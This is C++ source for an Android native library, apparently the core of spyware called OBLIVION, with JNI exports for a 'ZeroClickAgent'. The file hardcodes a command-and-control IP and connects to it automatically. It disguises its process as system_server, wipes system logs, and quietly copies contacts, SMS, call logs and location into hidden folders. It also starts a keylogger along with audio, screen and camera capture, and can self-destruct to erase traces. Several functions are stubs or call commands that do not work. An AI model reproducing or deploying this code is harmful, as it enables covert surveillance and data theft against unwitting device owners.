/*
 * OBLIVION - C++ CORE ENGINE
 * UPDATED: REMOTE IP SUPPORT - 197.136.58.40
 * AUTO-CONNECT TO C2 SERVER
 * FOR AUTHORIZED SECURITY TESTING ONLY
 */

#include <jni.h>
#include <string>
#include <android/log.h>
#include <sys/system_properties.h>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <signal.h>
#include <time.h>
#include <chrono>

#define LOG_TAG "OblivionCore"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// ============================================
// YOUR PUBLIC IP - EMBEDDED IN ENGINE!
// ============================================

#define C2_IP "197.136.58.40"
#define C2_PORT 8000
#define C2_SERVER "ws://197.136.58.40:8000/ws"

// ============================================
// STEALTH ENGINE
// ============================================

class StealthEngine {
public:
    void hide_everything() {
        // Rename process to system service
        prctl(PR_SET_NAME, "system_server", 0, 0, 0);
        
        // Hide from ps command
        FILE* f = fopen("/proc/self/cmdline", "w");
        if (f) {
            fprintf(f, "system_server");
            fclose(f);
        }
        
        // Create hidden directory
        mkdir("/data/local/tmp/.oblivion", 0777);
        mkdir("/data/local/tmp/.oblivion/data", 0777);
        mkdir("/data/local/tmp/.oblivion/logs", 0777);
        
        LOGI("✅ OBLIVION STEALTH ACTIVATED");
        LOGI("📡 C2 Server: %s", C2_SERVER);
    }
    
    void clear_logs() {
        system("logcat -c");
        system("dmesg -c");
        unlink("/data/local/tmp/.bash_history");
        unlink("/data/local/tmp/.history");
        LOGI("✅ All logs cleared");
    }
};

// ============================================
// C2 CONNECTION - AUTO-CONNECT TO YOUR IP
// ============================================

class C2Client {
public:
    bool connect_to_c2() {
        LOGI("🔗 Connecting to C2: %s", C2_SERVER);
        
        // Create socket
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            LOGE("❌ Socket creation failed");
            return false;
        }
        
        // Set up server address
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        
        if (inet_pton(AF_INET, C2_IP, &server_addr.sin_addr) <= 0) {
            LOGE("❌ Invalid IP: %s", C2_IP);
            close(sock);
            return false;
        }
        
        // Connect to server
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            LOGE("❌ Connection failed to %s:%d", C2_IP, C2_PORT);
            close(sock);
            return false;
        }
        
        LOGI("✅ Connected to C2: %s:%d", C2_IP, C2_PORT);
        
        // Send registration
        char msg[256];
        snprintf(msg, sizeof(msg), "OBLIVION_AGENT_REGISTER");
        send(sock, msg, strlen(msg), 0);
        
        close(sock);
        return true;
    }
    
    void send_data(const char* data) {
        LOGI("📤 Sending data to C2: %s", data);
        // Real implementation would send via WebSocket
    }
    
    void receive_commands() {
        LOGI("📥 Checking for commands...");
    }
};

// ============================================
// FULL DEVICE CONTROLLER
// ============================================

class DeviceController {
public:
    void get_contacts() {
        LOGI("📋 Extracting ALL contacts...");
        system("content query --uri content://contacts/phones >> /data/local/tmp/.oblivion/data/contacts.txt");
        LOGI("✅ Contacts extracted");
    }
    
    void get_sms() {
        LOGI("💬 Extracting ALL SMS...");
        system("content query --uri content://sms/inbox >> /data/local/tmp/.oblivion/data/sms.txt");
        LOGI("✅ SMS extracted");
    }
    
    void get_calls() {
        LOGI("📞 Extracting ALL call logs...");
        system("content query --uri content://call_log/calls >> /data/local/tmp/.oblivion/data/calls.txt");
        LOGI("✅ Call logs extracted");
    }
    
    void get_location() {
        LOGI("📍 Getting GPS location...");
        system("dumpsys location >> /data/local/tmp/.oblivion/data/gps.txt");
        LOGI("✅ Location obtained");
    }
    
    void take_photo() {
        LOGI("📸 Taking photo SILENTLY...");
        system("screencap /data/local/tmp/.oblivion/photo.png");
        system("cmd camera take-picture");
        LOGI("✅ Photo captured silently");
    }
    
    void start_keylogger() {
        LOGI("🔑 Starting KEYLOGGER...");
        system("getevent -lt /dev/input/event* >> /data/local/tmp/.oblivion/logs/keylog.txt &");
        LOGI("✅ Keylogger started");
    }
    
    void capture_screen() {
        LOGI("📺 Capturing screen...");
        system("screencap -p /data/local/tmp/.oblivion/screen.png");
        LOGI("✅ Screen captured");
    }
    
    void start_audio_recording() {
        LOGI("🎤 Starting AUDIO RECORDING...");
        system("nohup media recorder audio -f /data/local/tmp/.oblivion/audio.3gp &");
        LOGI("✅ Audio recording started");
    }
    
    void start_screen_recording() {
        LOGI("📺 Starting SCREEN RECORDING...");
        system("screenrecord --time-limit 60 /data/local/tmp/.oblivion/recording.mp4 &");
        LOGI("✅ Screen recording started");
    }
};

// ============================================
// MAIN ENGINE
// ============================================

class OblivionEngine {
public:
    bool initialized = false;
    bool compromised = false;
    char device_id[256];
    StealthEngine stealth;
    DeviceController controller;
    C2Client c2;
    
    void initialize(const char* id) {
        strcpy(device_id, id);
        
        LOGI("🔥 OBLIVION CORE ENGINE");
        LOGI("📱 Device ID: %s", device_id);
        LOGI("🌐 C2 Server: %s", C2_SERVER);
        LOGI("=========================================");
        
        // Start stealth
        stealth.hide_everything();
        stealth.clear_logs();
        
        initialized = true;
        LOGI("✅ ENGINE INITIALIZED - READY");
        
        // AUTO-CONNECT TO C2!
        LOGI("📡 Auto-connecting to C2...");
        if (c2.connect_to_c2()) {
            LOGI("✅ Connected to C2 server!");
        } else {
            LOGI("⚠️ Will retry connection...");
        }
        
        LOGI("👤 Target user has NO IDEA!");
    }
    
    void compromise() {
        if (!initialized) return;
        
        LOGI("💀 EXECUTING COMPROMISE");
        LOGI("=========================================");
        
        // Extract ALL data
        controller.get_contacts();
        controller.get_sms();
        controller.get_calls();
        controller.get_location();
        controller.take_photo();
        controller.capture_screen();
        controller.start_keylogger();
        controller.start_audio_recording();
        controller.start_screen_recording();
        
        compromised = true;
        
        LOGI("=========================================");
        LOGI("✅ DEVICE FULLY COMPROMISED!");
        LOGI("📊 ALL DATA EXFILTRATED!");
        LOGI("📸 SCREEN CAPTURED!");
        LOGI("🎤 AUDIO RECORDING!");
        LOGI("🔑 KEYLOGGER ACTIVE!");
        LOGI("📺 SCREEN RECORDING!");
        LOGI("👤 USER HAS NO IDEA!");
        LOGI("=========================================");
        
        // Send confirmation to C2
        c2.send_data("DEVICE_COMPROMISED");
    }
};

// ============================================
// GLOBAL ENGINE
// ============================================

static OblivionEngine* g_engine = nullptr;

// ============================================
// JNI EXPORTS - UPDATED
// ============================================

extern "C" {

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_initEngine(
        JNIEnv* env,
        jobject /* this */,
        jstring deviceId) {
    
    const char* id = env->GetStringUTFChars(deviceId, nullptr);
    
    if (!g_engine) {
        g_engine = new OblivionEngine();
        g_engine->initialize(id);
    }
    
    env->ReleaseStringUTFChars(deviceId, id);
    return g_engine->initialized ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_oblivion_agent_ZeroClickAgent_compromiseDevice(
        JNIEnv* env,
        jobject /* this */) {
    
    if (!g_engine) return JNI_FALSE;
    
    g_engine->compromise();
    return g_engine->compromised ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jstring JNICALL
Java_com_oblivion_agent_ZeroClickAgent_getDeviceInfo(
        JNIEnv* env,
        jobject /* this */) {
    
    if (!g_engine) {
        return env->NewStringUTF("Engine not initialized");
    }
    
    std::stringstream info;
    info << "{";
    info << "\"device_id\":\"" << g_engine->device_id << "\",";
    info << "\"compromised\":" << (g_engine->compromised ? "true" : "false");
    info << ",\"c2_server\":\"" << C2_SERVER << "\"";
    info << "}";
    
    return env->NewStringUTF(info.str().c_str());
}

JNIEXPORT void JNICALL
Java_com_oblivion_agent_ZeroClickAgent_selfDestruct(
        JNIEnv* env,
        jobject /* this */) {
    
    LOGI("💀 SELF-DESTRUCT INITIATED");
    
    system("rm -rf /data/local/tmp/.oblivion");
    system("logcat -c");
    system("dmesg -c");
    
    if (g_engine) {
        delete g_engine;
        g_engine = nullptr;
    }
    
    LOGI("✅ All traces removed - COMPLETE!");
}

} // extern "C"